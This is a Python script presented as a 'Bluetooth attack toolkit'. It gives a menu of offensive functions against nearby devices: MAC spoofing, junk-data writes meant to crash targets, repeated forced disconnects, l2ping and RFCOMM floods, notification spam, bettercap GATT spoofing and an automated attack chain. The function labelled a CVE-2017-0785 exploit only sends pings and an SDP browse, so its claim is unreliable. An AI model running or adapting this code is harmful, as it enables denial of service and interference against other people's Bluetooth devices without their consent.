#!/usr/bin/env python3
"""
ZeroSync v7.4 – Ultimate Bluetooth Attack Toolkit
Author: Null_Lyfe
"""

import os
import sys
import time
import random
import subprocess
from datetime import datetime
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, BTLEException, ADDR_TYPE_PUBLIC, ADDR_TYPE_RANDOM
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt
from rich import box

console = Console()
seen_devices = {}

class BLEHandler(DefaultDelegate):
    def __init__(self): super().__init__()
    def handleNotification(self, cHandle, data): console.print(f"[yellow]📥 Notification: {data}[/yellow]")

# ─── Core Functions ─────────────────────────────────────────────────────────────
def scan_devices():
    console.print("[cyan]🔎 Scanning for BLE devices...[/cyan]")
    scanner = Scanner()
    try:
        devices = scanner.scan(10.0)
        for idx, d in enumerate(devices):
            mac = d.addr
            rssi = d.rssi
            if mac not in seen_devices:
                seen_devices[mac] = {"first_seen": datetime.now().strftime("%H:%M:%S"), "max_rssi": rssi}
            else:
                seen_devices[mac]["max_rssi"] = max(seen_devices[mac]["max_rssi"], rssi)
            console.print(f"[magenta]{idx}[/magenta]: {mac} RSSI={rssi} dB")
        return devices
    except BTLEException as e:
        console.print(f"[red]❌ Scan error: {e}[/red]")
        return []

def view_scan_log():
    if not seen_devices:
        console.print("[red]⚠️ No devices scanned yet.[/red]")
        return
    t = Table(title="Scan Log", box=box.SIMPLE)
    t.add_column("MAC", style="magenta")
    t.add_column("First Seen", style="cyan")
    t.add_column("Max RSSI", justify="right")
    for mac, meta in seen_devices.items():
        t.add_row(mac, meta["first_seen"], str(meta["max_rssi"]))
    console.print(t)

def spoof_mac():
    new_mac = Prompt.ask("🎭 Enter new MAC address")
    os.system("sudo ifconfig hci0 down")
    os.system(f"sudo bdaddr -i hci0 {new_mac}")
    os.system("sudo ifconfig hci0 up")
    console.print("[green]✅ MAC spoofed successfully.[/green]")

def stealth_mode():
    subprocess.run(["bluetoothctl", "power", "on"], stdout=subprocess.DEVNULL)
    subprocess.run(["bluetoothctl", "discoverable", "off"], stdout=subprocess.DEVNULL)
    subprocess.run(["bluetoothctl", "pairable", "off"], stdout=subprocess.DEVNULL)
    subprocess.run(["hciconfig", "hci0", "noscan"], stdout=subprocess.DEVNULL)
    console.print("[magenta]🕶️ BLE stealth mode activated[/magenta]")

def broadcast_names():
    names = ["UFO_SCAN", "NSA_Van", "💀 ZeroSync 💀", "Free_Wifi", "BLE_BOMB"]
    try:
        while True:
            for n in names:
                subprocess.run(["bluetoothctl", "system-alias", n], stdout=subprocess.DEVNULL)
                console.print(f"[blue]📡 Broadcasting as {n}[/blue]")
                time.sleep(1.5)
    except KeyboardInterrupt:
        subprocess.run(["bluetoothctl", "system-alias", "ZeroSync"], stdout=subprocess.DEVNULL)
        console.print("[red]🛑 Advertising stopped.[/red]")

def export_logs():
    os.makedirs("zerosync_logs", exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = f"zerosync_logs/session_{timestamp}.log"
    with open(path, "w") as f:
        for mac, meta in seen_devices.items():
            f.write(f"{mac} | First Seen: {meta['first_seen']} | Max RSSI: {meta['max_rssi']}\n")
    console.print(f"[green]📁 Logs saved to {path}[/green]")

# ─── Offensive BLE Attacks ───────────────────────────────────────────────────────
def crash_device():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("💥 Crash index"))
    addr = devices[idx].addr
    try:
        p = Peripheral(addr, ADDR_TYPE_PUBLIC)
        for _ in range(30):
            p.writeCharacteristic(0x000b, os.urandom(30), withResponse=False)
            console.print(f"[red]💣 Sent junk to {addr}[/red]")
            time.sleep(0.2)
    except Exception as e:
        console.print(f"[dim]⚠️ Crash error: {e}[/dim]")

def ble_deauth():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("✂️ Index to deauth"))
    addr = devices[idx].addr
    for i in range(20):
        subprocess.run(["hcitool", "dc", addr], stdout=subprocess.DEVNULL)
        console.print(f"[red]✂️ Deauth packet sent to {addr} ({i+1})[/red]")
        time.sleep(0.3)

def cve_2017_0785():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("💣 CVE target index"))
    addr = devices[idx].addr
    console.print(f"[cyan]Launching CVE-2017-0785 sequence on {addr}[/cyan]")
    subprocess.run(["l2ping", "-c", "3", "-s", "800", addr], stdout=subprocess.DEVNULL)
    subprocess.run(["sdptool", "browse", addr], stdout=subprocess.DEVNULL)
    subprocess.run(["l2ping", "-c", "5", "-s", "2048", addr], stdout=subprocess.DEVNULL)
    console.print("[green]✅ CVE packet sequence dispatched[/green]")

def replay_notification():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("💌 Replay index"))
    msg = Prompt.ask("💌 Message to spam").encode()
    addr = devices[idx].addr
    try:
        p = Peripheral(addr, ADDR_TYPE_RANDOM)
        p.setDelegate(BLEHandler())
        for _ in range(25):
            p.writeCharacteristic(0x0001, msg)
            console.print(f"[green]💌 Spammed {msg.decode(errors='ignore')}[/green]")
            time.sleep(0.5)
    except Exception as e:
        console.print(f"[red]Replay error: {e}[/red]")

def rfcomm_flood():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("📡 Index for RFCOMM flood"))
    addr = devices[idx].addr
    for i in range(10):
        try:
            subprocess.run(["rfcomm", "connect", addr, "1"], timeout=3)
            console.print(f"[cyan]Attempt {i+1}: RFCOMM sent[/cyan]")
        except:
            console.print(f"[dim]Timeout or fail on attempt {i+1}[/dim]")

def l2ping_dos():
    devices = scan_devices()
    if not devices: return
    idx = int(Prompt.ask("📶 L2Ping DoS index"))
    addr = devices[idx].addr
    console.print(f"[yellow]Pinging {addr} with L2Ping flood...[/yellow]")
    subprocess.run(["l2ping", "-s", "600", "-f", addr])

# ─── Advanced Features ──────────────────────────────────────────────────────────
def audio_deception():
    console.print("[cyan]🎵 Playing decoy audio file to simulate Bluetooth speaker...[/cyan]")
    os.system("paplay /usr/share/sounds/freedesktop/stereo/message.oga")  # Change to your own if needed

def gatt_spoof():
    console.print("[cyan]🎭 Starting fake GATT advertisement...[/cyan]")
    os.system("gnome-terminal -- bash -c 'bettercap -eval \"ble.recon on; ble.gatt.write; ble.gatt.spoof\"'")

def launch_mesh():
    console.print("[magenta]🌐 Starting ZeroJam mesh injection...[/magenta]")
    os.system("gnome-terminal -- bash -c 'bettercap -eval \"ble.recon on; ble.advertise on; ble.advertise.manufacturer 1337\"'")

def attack_chain():
    console.print("[cyan]🎯 Executing automated attack chain...[/cyan]")
    scan_devices()
    ble_deauth()
    time.sleep(1)
    cve_2017_0785()
    time.sleep(1)
    replay_notification()
    console.print("[green]✅ Chain complete[/green]")

def bettercap_bridge():
    os.system("gnome-terminal -- bettercap -eval 'ble.recon on; ble.enum on; net.probe on'")
    console.print("[cyan]💉 Bettercap BLE recon started in terminal[/cyan]")

# ─── Main Menu ──────────────────────────────────────────────────────────────────
def main_menu():
    while True:
        console.print(Panel("[bold cyan]ZeroSync v7.4 – Created by Null_Lyfe[/bold cyan]", border_style="bright_magenta"))
        t = Table(title="ZeroSync Main Menu", box=box.ROUNDED)
        t.add_column("ID", justify="center", style="magenta")
        t.add_column("Function", style="white")
        entries = [
            ("1", "Scan for BLE Devices"),
            ("2", "View Scan History"),
            ("3", "MAC Spoofing"),
            ("4", "Stealth Mode"),
            ("5", "Broadcast Aliases"),
            ("6", "Deauth BLE Device"),
            ("7", "Crash BLE Device"),
            ("8", "Replay Notification Spam"),
            ("9", "RFCOMM Flood"),
            ("10", "L2Ping DoS"),
            ("11", "Exploit CVE-2017-0785"),
            ("12", "Bettercap BLE Bridge"),
            ("13", "Export Scan Logs"),
            ("14", "Audio Deception"),
            ("15", "GATT Spoofing"),
            ("16", "ZeroJam Mesh Injection"),
            ("17", "Auto Attack Chain"),
            ("0", "Exit"),
        ]
        for id_, name in entries:
            t.add_row(id_, name)
        console.print(t)

        choice = Prompt.ask("💜 Choose")
        match choice:
            case "1": scan_devices()
            case "2": view_scan_log()
            case "3": spoof_mac()
            case "4": stealth_mode()
            case "5": broadcast_names()
            case "6": ble_deauth()
            case "7": crash_device()
            case "8": replay_notification()
            case "9": rfcomm_flood()
            case "10": l2ping_dos()
            case "11": cve_2017_0785()
            case "12": bettercap_bridge()
            case "13": export_logs()
            case "14": audio_deception()
            case "15": gatt_spoof()
            case "16": launch_mesh()
            case "17": attack_chain()
            case "0": console.print("[red]👋 Exiting ZeroSync...[/red]"); sys.exit()
            case _: console.print("[red]Invalid choice[/red]")

if __name__ == "__main__":
    main_menu()